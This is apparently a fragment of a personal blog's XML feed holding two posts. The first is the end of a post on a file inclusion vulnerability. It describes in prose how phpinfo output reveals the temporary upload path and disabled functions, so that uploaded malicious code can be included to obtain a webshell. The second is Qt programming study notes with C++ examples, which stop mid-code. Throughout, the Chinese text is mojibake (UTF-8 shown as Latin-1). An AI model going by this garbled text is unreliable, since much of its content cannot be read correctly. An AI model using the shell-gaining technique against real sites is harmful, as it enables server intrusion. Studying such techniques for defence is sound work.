æ‰¾åˆ°SQLæ³¨å…¥ç‚¹æ—¶ï¼Œè¦ä¸Šä¼ æœ¨é©¬çš„æ—¶å€™å°±éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„æ‰å¯ä»¥è·å–webshellã€‚å‡å¦‚è¯¥ç½‘ç«™ä½¿ç”¨çš„æ˜¯å¦‚xamppä¹‹ç±»çš„å¿«é€Ÿæ­å»ºçš„è½¯ä»¶ï¼Œä½ ä¾¿å¯ä»¥å¯»æ‰¾è¯¥è½¯ä»¶å¯¹åº”çš„æ¼æ´å»å°è¯•æ”»å‡»ç›®æ ‡ç½‘ç«™ã€‚</p><ol><li>disable_functions</li></ol><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928215953280.png" alt="image-20200928215953280"></p><p>é€šè¿‡disable_functionsä½ å¯ä»¥äº†è§£åˆ°è¯¥ç½‘ç«™ç¦ç”¨äº†äº›ä»€ä¹ˆå‡½æ•°ï¼Œç„¶åå»ç»•è¿‡ä»£ç æ‰§è¡Œå’Œç¼–å†™webshellæ—¶é‡åˆ°çš„é—®é¢˜ã€‚</p><ol><li>ä¸´æ—¶æ–‡ä»¶è·¯å¾„</li><li><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20200928220004673.png" alt="image-20200928220004673"></li></ol><p>è¿™æ¬¡é€šè¿‡phpinfoæ¥getshellçš„å…³é”®ï¼Œphpinfoå¯ä»¥è®©æˆ‘ä»¬è·å¾—ä¸´æ—¶æ–‡ä»¶è·¯å¾„ã€‚å‘phpinfoé¡µé¢postæ¶æ„ä»£ç ï¼Œå¯ä»¥åœ¨_FILES[â€œfile1â€]ä¸­çœ‹åˆ°ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœè¯¥ç½‘ç«™å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä¾¿å¯ä»¥å°†æ¶æ„ä»£ç å­˜å‚¨æˆ‘ä»¬å·²çŸ¥çš„ç»å¯¹è·¯å¾„å»åŒ…å«å®ƒgetshellã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä»Šå¤©åœ¨æ•´ç†ç¡¬ç›˜çš„ä¸€äº›ä¸œè¥¿ï¼Œæœ‰äº›webå­¦çš„ä¸œè¥¿åˆä¸æƒ³æ‰”ï¼Œå°±ä¼ ä¸Šæ¥ã€‚&lt;/p&gt;
&lt;h1 id=&quot;æ–‡ä»¶åŒ…å«&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶åŒ…å«&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶åŒ…å«&quot;&gt;&lt;/a&gt;æ–‡ä»¶åŒ…å«&lt;/h1&gt;&lt;h2 id=&quot;0x01å®šä¹‰&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="https://pz1o.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>å¤§äºŒç¨‹åºè®¾è®¡ç»¼åˆå®è·µ</title>
    <link href="https://pz1o.top/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/"/>
    <id>https://pz1o.top/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/</id>
    <published>2020-12-07T06:32:17.000Z</published>
    <updated>2020-12-08T16:15:50.432Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ"><a href="#ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ" class="headerlink" title="ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ"></a>ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ</h1><p>å›¾å½¢åŒ–ç¼–ç¨‹</p><p>è¿™ä¸åŒè¯­è¨€åˆ†æ•°è¿˜ä¸å¤ªä¸€æ ·ï¼Œæœ€åç”¨Qtäº†</p><p>å››ä¸ªæ˜ŸæœŸå››ä¸ªå®éªŒï¼Œåº”è¯¥é—®é¢˜ä¸å¤§</p><p>è¶ä¸‹æ¬¡æ¯”èµ›ä¹‹å‰æŠŠè¿™ä¸ªå®éªŒå¼„å®Œ</p><p>å…ˆè´´é“¾æ¥</p><p><a href="https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1g4411H78N?from=search&amp;seid=13020735672539057046</a></p><p>ä¸‹é¢å°½é‡ç”¨ä»£ç å’Œæ³¨é‡Šä»‹ç»åŸºç¡€çŸ¥è¯†ï¼Œå†™å¾—æœ‰ç‚¹ä¹±ï¼Œå¯ä»¥çœ‹bç«™å»å­¦</p><p>ä¸»è¦æ˜¯è‡ªå·±è®°å½•ä¸€ä¸‹çŸ¥è¯†</p><p>æˆ‘ç”¨çš„æ˜¯5.14çš„ bç«™åº”è¯¥æ˜¯5.5çš„ æœ‰äº›çŸ¥è¯†ä¼šæœ‰ç‚¹å‡ºå…¥</p><h1 id="Qt"><a href="#Qt" class="headerlink" title="Qt"></a>Qt</h1><h2 id="0x01-åˆ›å»ºqté¡¹ç›®"><a href="#0x01-åˆ›å»ºqté¡¹ç›®" class="headerlink" title="0x01 åˆ›å»ºqté¡¹ç›®"></a>0x01 åˆ›å»ºqté¡¹ç›®</h2><p>å®‰è£…å®Œæˆå</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/811f3f2557606ad0c304488b41000c5f.png" alt="image-20201014194802950"></p><p>å¯ä»¥å…ˆçœ‹ä¸€ä¸‹ä¸Šé¢è¿™ä¸ªå†…å®¹</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt5%20%E6%A8%A1%E5%9D%97.png" alt="Qt5 æ¨¡å—"></p><h3 id="1-æ–°å»ºé¡¹ç›®"><a href="#1-æ–°å»ºé¡¹ç›®" class="headerlink" title="1.æ–°å»ºé¡¹ç›®"></a>1.æ–°å»ºé¡¹ç›®</h3><p>é€‰ç¬¬ä¸€ä¸ª</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153603804.png" alt="image-20201207153603804"></p><p>ä¸€ç›´é»˜è®¤ï¼Œç›´åˆ°é€‰ç±»å<img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153634092.png" alt="image-20201207153634092"></p><p>ä¹‹åä¸€ç›´é»˜è®¤å°±å¯ä»¥äº†</p><p>æœ€ç»ˆç•Œé¢å¦‚å›¾</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207153758775.png" alt="image-20201207153758775"></p><h3 id="2-proæ–‡ä»¶"><a href="#2-proæ–‡ä»¶" class="headerlink" title="2. .proæ–‡ä»¶"></a>2. .proæ–‡ä»¶</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">QT       += core gui  <span class="comment">//åŒ…å«çš„æ¨¡å—</span></span><br><span class="line">greaterThan(QT_MAJOR_VERSION, <span class="number">4</span>): QT += widgets <span class="comment">//å¤§äºQt4ç‰ˆæœ¬ æ‰åŒ…å«widgetæ¨¡å—</span></span><br><span class="line">TARGET = QtFirst  <span class="comment">//åº”ç”¨ç¨‹åºå  ç”Ÿæˆçš„.exeç¨‹åºåç§°</span></span><br><span class="line">TEMPLATE = app    <span class="comment">//æ¨¡æ¿ç±»å‹    åº”ç”¨ç¨‹åºæ¨¡æ¿</span></span><br><span class="line">SOURCES += main.cpp\   <span class="comment">//æºæ–‡ä»¶</span></span><br><span class="line">        mywidget.cpp</span><br><span class="line">HEADERS  += mywidget.h   <span class="comment">//å¤´æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><blockquote><p><strong><em>\</em>.proå°±æ˜¯å·¥ç¨‹æ–‡ä»¶(project)ï¼Œå®ƒæ˜¯qmakeè‡ªåŠ¨ç”Ÿæˆçš„ç”¨äºç”Ÿäº§makefileçš„é…ç½®æ–‡ä»¶**</strong>ã€‚</p></blockquote><h3 id="3-main-cpp"><a href="#3-main-cpp" class="headerlink" title="3.main.cpp"></a>3.main.cpp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mainwindow.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QApplication&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//a åº”ç”¨ç¨‹åºå¯¹è±¡ åœ¨Qtä¸­ æœ‰ä¸”ä»…æœ‰ä¸€ä¸ª</span></span><br><span class="line">    <span class="function">QApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    <span class="comment">//çª—å£å¯¹è±¡ MainWindow</span></span><br><span class="line">    MainWindow w;</span><br><span class="line">    <span class="comment">//å¿…é¡»è¦showæ–¹æ³•æ‰å¯ä»¥å±•ç¤º</span></span><br><span class="line">    w.show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£é‡Šï¼š</p><ul><li>Qtç³»ç»Ÿæä¾›çš„æ ‡å‡†ç±»åå£°æ˜å¤´æ–‡ä»¶æ²¡æœ‰.håç¼€</li><li>Qtä¸€ä¸ªç±»å¯¹åº”ä¸€ä¸ªå¤´æ–‡ä»¶ï¼Œç±»åå°±æ˜¯å¤´æ–‡ä»¶å</li><li>QApplicationåº”ç”¨ç¨‹åºç±»</li><li><ol><li>ç®¡ç†å›¾å½¢ç”¨æˆ·ç•Œé¢åº”ç”¨ç¨‹åºçš„æ§åˆ¶æµå’Œä¸»è¦è®¾ç½®ã€‚</li><li>æ˜¯Qtçš„æ•´ä¸ªåå°ç®¡ç†çš„å‘½è„‰å®ƒ<strong>åŒ…å«ä¸»äº‹ä»¶å¾ªç¯**</strong>ï¼Œåœ¨å…¶ä¸­æ¥è‡ªçª—å£ç³»ç»Ÿå’Œå…¶å®ƒèµ„æºçš„<strong>*æ‰€æœ‰äº‹ä»¶å¤„ç†å’Œè°ƒåº¦ã€‚å®ƒä¹Ÿå¤„ç†åº”ç”¨ç¨‹åºçš„åˆå§‹åŒ–å’Œç»“æŸ</strong>ï¼Œå¹¶ä¸”<strong>æä¾›å¯¹è¯ç®¡ç†</strong>ã€‚</li><li>å¯¹äºä»»ä½•ä¸€ä¸ªä½¿ç”¨Qtçš„å›¾å½¢ç”¨æˆ·ç•Œé¢åº”ç”¨ç¨‹åºï¼Œéƒ½æ­£å¥½å­˜åœ¨ä¸€ä¸ªQApplication å¯¹è±¡ï¼Œè€Œä¸è®ºè¿™ä¸ªåº”ç”¨ç¨‹åºåœ¨åŒä¸€æ—¶é—´å†…æ˜¯ä¸æ˜¯æœ‰0ã€1ã€2æˆ–æ›´å¤šä¸ªçª—å£ã€‚</li></ol></li><li><p>a.exec()</p></li></ul><p>ç¨‹åºè¿›å…¥æ¶ˆæ¯å¾ªç¯ï¼Œç­‰å¾…å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå“åº”ã€‚è¿™é‡Œmain()æŠŠæ§åˆ¶æƒè½¬äº¤ç»™Qtï¼ŒQtå®Œæˆäº‹ä»¶å¤„ç†å·¥ä½œï¼Œå½“åº”ç”¨ç¨‹åºé€€å‡ºçš„æ—¶å€™exec()çš„å€¼å°±ä¼šè¿”å›ã€‚<strong>åœ¨exec()ä¸­ï¼ŒQtæ¥å—å¹¶å¤„ç†ç”¨æˆ·å’Œç³»ç»Ÿçš„äº‹ä»¶å¹¶ä¸”æŠŠå®ƒä»¬ä¼ é€’ç»™é€‚å½“çš„çª—å£éƒ¨ä»¶ã€‚</strong></p><h3 id="4-å¿«æ·é”®åŠå‘½åè§„èŒƒ"><a href="#4-å¿«æ·é”®åŠå‘½åè§„èŒƒ" class="headerlink" title="4.å¿«æ·é”®åŠå‘½åè§„èŒƒ"></a>4.å¿«æ·é”®åŠå‘½åè§„èŒƒ</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å‘½åè§„èŒƒ </span></span><br><span class="line"><span class="comment">//ç±»å é¦–å­—æ¯å¤§å†™ï¼Œå•è¯å’Œå•è¯ä¹‹é—´é¦–å­—æ¯å¤§å†™</span></span><br><span class="line"><span class="comment">//å‡½æ•°å é¦–å­—æ¯å°å†™</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl + / æ³¨é‡Š</span></span><br><span class="line"><span class="comment">//ctrl + r è¿è¡Œ</span></span><br><span class="line"><span class="comment">//ctrl + b ç¼–è¯‘</span></span><br><span class="line"><span class="comment">//f1 å¸®åŠ©æ–‡æ¡£</span></span><br><span class="line"><span class="comment">//ctrl + shift + ä¸Š ä¸Šç§»</span></span><br><span class="line"><span class="comment">//ctrl + i å¯¹é½</span></span><br><span class="line"><span class="comment">//f4 åˆ‡æ¢.cpp å’Œ .h</span></span><br></pre></td></tr></table></figure><h2 id="0x02-æ–°å»ºQtç¨‹åº"><a href="#0x02-æ–°å»ºQtç¨‹åº" class="headerlink" title="0x02 æ–°å»ºQtç¨‹åº"></a>0x02 æ–°å»ºQtç¨‹åº</h2><h3 id="1-QPushButton"><a href="#1-QPushButton" class="headerlink" title="1.QPushButton"></a>1.QPushButton</h3><p>åˆ›å»ºæŒ‰é’®</p><p>æŠŠä¸‹é¢è¿™æ®µä»£ç å¤åˆ¶åˆ°widget.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">//æŒ‰é’®æ“ä½œ</span></span><br><span class="line">  <span class="comment">//åˆ›å»ºç¬¬ä¸€ä¸ªæŒ‰é’®</span></span><br><span class="line">    QPushButton * btn = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    <span class="comment">//showä»¥é¡¶å±‚æ–¹å¼å¼¹å‡ºæ§ä»¶</span></span><br><span class="line">    btn-&gt;show(); </span><br><span class="line">    <span class="comment">//è®¾ç½®çˆ¶äº²</span></span><br><span class="line">    btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//æ˜¾ç¤ºæ–‡æœ¬</span></span><br><span class="line">    btn-&gt;setText(<span class="string">"ç¬¬ä¸€ä¸ª"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æ­¤å¤–è¿˜æœ‰ç¬¬äºŒç§æ–¹æ³•è¿›è¡Œæ“ä½œ</span></span><br><span class="line">    <span class="comment">//åˆ›å»ºç¬¬äºŒä¸ªæŒ‰é’®</span></span><br><span class="line">    <span class="comment">//æŒ‰ç…§æ§ä»¶å¤§å°åˆ›å»ºçª—å£</span></span><br><span class="line">    QPushButton * btn2 = <span class="keyword">new</span> QPushButton(<span class="string">"ç¬¬äºŒä¸ª"</span>,<span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">//ç§»åŠ¨btn2æŒ‰é’®</span></span><br><span class="line">    btn2-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line">    <span class="comment">//é‡ç½®æŒ‰é’®å¤§å°</span></span><br><span class="line">    btn2-&gt;resize(<span class="number">50</span>,<span class="number">50</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//çª—å£æ“ä½œ</span></span><br><span class="line">    <span class="comment">//é‡ç½®çª—å£å¤§å°</span></span><br><span class="line">    resize(<span class="number">600</span>,<span class="number">400</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®å›ºå®šçª—å£å¤§å°</span></span><br><span class="line">    <span class="comment">//setFixedSize(600,400);</span></span><br><span class="line">    <span class="comment">//è®¾ç½®çª—å£æ ‡é¢˜</span></span><br><span class="line">    setWindowTitle(<span class="string">"è®¡ç®—å™¨"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155120350.png" alt="image-20201207155120350"></p><h3 id="2-å¯¹è±¡æ ‘"><a href="#2-å¯¹è±¡æ ‘" class="headerlink" title="2.å¯¹è±¡æ ‘"></a>2.å¯¹è±¡æ ‘</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155310260.png" alt="image-20201207155310260"></p><p>è‡ªå·±åˆ›å»ºä¸€ä¸ªMyPushButton</p><p>åŒæ—¶ç»§æ‰¿QPushButton</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207155345296.png" alt="image-20201207155345296"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111505680.png" alt="image-20201207111505680"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111746909.png" alt="image-20201207111746909"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111806797.png" alt="image-20201207111806797"></p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207111921782.png" alt="image-20201207111921782"></p><p>ä»£ç å¦‚ä¸‹</p><p><code>mypushbutton.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"mypushbutton.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">MyPushButton::MyPushButton(QWidget *parent) : QPushButton(parent)</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æŒ‰é’®æ„é€ è°ƒç”¨"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MyPushButton::~MyPushButton()</span><br><span class="line">&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æŒ‰é’®æ„é€ ææ„"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>mypushbutton.h</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYPUSHBUTTON_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYPUSHBUTTON_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QWidget&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPushButton</span> :</span> <span class="keyword">public</span> QPushButton</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MyPushButton</span><span class="params">(QWidget *parent = <span class="literal">nullptr</span>)</span></span>;</span><br><span class="line">     ~MyPushButton();</span><br><span class="line">signals:</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYPUSHBUTTON_H</span></span></span><br></pre></td></tr></table></figure><p><code>widget.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºè‡ªå·±æŒ‰é’®å¯¹è±¡</span></span><br><span class="line">MyPushButton *btn3 = <span class="keyword">new</span> MyPushButton;</span><br><span class="line">btn3-&gt;show();</span><br><span class="line">btn3-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">btn3-&gt;setText(<span class="string">"æˆ‘çš„æŒ‰é’®"</span>);</span><br><span class="line">btn3-&gt;<span class="built_in">move</span>(<span class="number">200</span>,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>å›¾ç¤ºå¦‚ä¸‹</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207215449993.png" alt="image-20201207215449993"></p><h2 id="0x03-ä¿¡å·å’Œæ§½çš„æœºåˆ¶"><a href="#0x03-ä¿¡å·å’Œæ§½çš„æœºåˆ¶" class="headerlink" title="0x03 ä¿¡å·å’Œæ§½çš„æœºåˆ¶"></a>0x03 ä¿¡å·å’Œæ§½çš„æœºåˆ¶</h2><h3 id="1-ä¿¡å·å’Œæ§½"><a href="#1-ä¿¡å·å’Œæ§½" class="headerlink" title="1.ä¿¡å·å’Œæ§½"></a>1.ä¿¡å·å’Œæ§½</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/Qt%E4%BF%A1%E5%8F%B7%E5%92%8C%E6%A7%BD%20.png" alt="Qtä¿¡å·å’Œæ§½ "></p><p>åŸºæœ¬çš„æ¥å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;ç»™æˆ‘çš„æŒ‰é’®ä¸€ä¸ªå…³é—­çª—å£çš„åŠŸèƒ½</span><br><span class="line">&#x2F;&#x2F;å‚æ•°1 ä¿¡å·å‘é€è€… å‚æ•°2 å‘é€çš„ä¿¡å·(å‡½æ•°åœ°å€) å‚æ•°3 ä¿¡å·æ¥æ”¶è€… å‚æ•°4 å¤„ç†çš„æ§½å‡½æ•°</span><br><span class="line">connect(btn3, &amp;QPushButton::clicked, this, &amp;QWidget::close);</span><br></pre></td></tr></table></figure><h4 id="è‡ªå®šä¹‰ä¿¡å·å’Œæ§½"><a href="#è‡ªå®šä¹‰ä¿¡å·å’Œæ§½" class="headerlink" title="è‡ªå®šä¹‰ä¿¡å·å’Œæ§½"></a><strong>è‡ªå®šä¹‰ä¿¡å·å’Œæ§½</strong></h4><p>è‡ªå®šä¹‰ä¿¡å·</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç±»çš„.hæ–‡ä»¶ä¸‹</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="comment">//è‡ªå®šä¹‰ä¿¡å· å†™åœ¨signalsä¸‹</span></span><br><span class="line">    <span class="comment">//è¿”å›å€¼æ˜¯void åªéœ€è¦å£°æ˜ ä¸éœ€è¦å®ç°</span></span><br><span class="line">    <span class="comment">//å¯ä»¥æœ‰å‚æ•°ï¼Œå¯ä»¥é‡è½½</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>è‡ªå®šä¹‰æ§½</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç±»çš„.æ–‡ä»¶publicä¸­</span></span><br><span class="line"><span class="keyword">public</span></span><br><span class="line">    <span class="comment">//è¿”å›å€¼æ˜¯void éœ€è¦å£°æ˜ éœ€è¦å®ç°</span></span><br><span class="line">    <span class="comment">//å¯ä»¥æœ‰å‚æ•°ï¼Œå¯ä»¥é‡è½½</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recv</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°åœ¨ç±»çš„.cppä¸­å®ç°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyPushButton::recv</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æ¥å—æˆåŠŸ"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è¿›è¡Œä¸€ä¸ª<strong>å°çš„æ¡ˆä¾‹</strong></p><blockquote><p>ä¸€ä¸ªæŒ‰é’®å“èµ·ä¹‹å ç¨‹åºè¾“å‡ºæ¥å—æˆåŠŸ</p></blockquote><p>æˆ‘ä»¬é¦–å…ˆå¾—æœ‰ä¸¤ä¸ªç±»</p><ol><li>button</li><li>recv</li></ol><p>ç„¶åå¾—æœ‰<strong>ä¿¡å· æ§½å‡½æ•° å®šä¹‰æ§½å‡½æ•° </strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 